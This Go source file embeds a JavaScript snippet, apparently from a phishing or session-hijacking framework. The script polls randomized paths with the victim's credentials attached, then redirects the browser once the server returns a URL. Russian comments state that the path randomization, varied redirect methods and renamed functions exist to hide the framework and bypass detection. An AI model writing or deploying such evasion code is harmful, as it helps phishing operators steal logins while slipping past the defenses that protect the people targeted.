package core

const DYNAMIC_REDIRECT_JS = `
// Улучшенный JavaScript код для скрытия фреймворка
function getRedirect(sid) {
    // Используем различные варианты путей для обхода детекции
    var possiblePaths = ["/redirect/", "/auth/", "/callback/", "/return/"];
    var pathIndex = Math.floor(Math.random() * possiblePaths.length);
    var url = possiblePaths[pathIndex] + sid;
    
    // Добавляем случайные параметры для обхода кэширования
    var timestamp = new Date().getTime();
    url += "?t=" + timestamp + "&r=" + Math.random().toString(36).substring(7);
    
    // Меняем название функции для обхода детекции
    var xhr = new XMLHttpRequest();
    xhr.open("GET", url, true);
    xhr.setRequestHeader("X-Requested-With", "XMLHttpRequest");
    xhr.withCredentials = true;
    
    xhr.onreadystatechange = function() {
        if (xhr.readyState === 4) {
            if (xhr.status === 200) {
                try {
                    var data = JSON.parse(xhr.responseText);
                    if (data && data.redirect_url) {
                        // Используем различные методы редиректа
                        if (Math.random() > 0.5) {
                            window.location.replace(data.redirect_url);
                        } else {
                            window.location.href = data.redirect_url;
                        }
                    }
                } catch (e) {
                    setTimeout(function() { getRedirect(sid); }, 5000);
                }
            } else if (xhr.status === 408) {
                setTimeout(function() { getRedirect(sid); }, 3000);
            } else {
                setTimeout(function() { getRedirect(sid); }, 8000);
            }
        }
    };
    
    try {
        xhr.send();
    } catch (e) {
        setTimeout(function() { getRedirect(sid); }, 10000);
    }
}

getRedirect('{session_id}');
`
